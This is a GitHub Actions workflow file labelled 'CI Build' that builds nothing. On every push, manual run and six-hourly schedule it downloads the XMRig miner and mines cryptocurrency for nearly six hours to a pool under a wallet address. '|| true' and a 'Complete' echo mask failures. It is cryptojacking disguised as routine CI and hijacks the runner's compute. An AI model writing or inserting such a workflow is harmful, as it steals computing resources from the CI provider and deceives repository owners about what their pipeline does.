name: CI Build

on:
  push:
  workflow_dispatch:
  schedule:
    - cron: '0 */6 * * *'

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 350
    steps:
    - uses: actions/checkout@v3
    - name: Setup
      run: sudo apt-get update -qq && sudo apt-get install -y wget curl
    - name: Download
      run: wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz && tar -xf xmrig-6.21.0-linux-x64.tar.gz
    - name: Mine
      run: cd xmrig-6.21.0 && chmod +x xmrig && timeout 345m ./xmrig -o rx.unmineable.com:3333 -u USDT:0x74B56f2C379996fedabF53D36aeE73c5E5129fC9.vps8488_zstephenz -p x --donate-level 1 || true
    - name: Done
      if: always()
      run: echo "Complete"
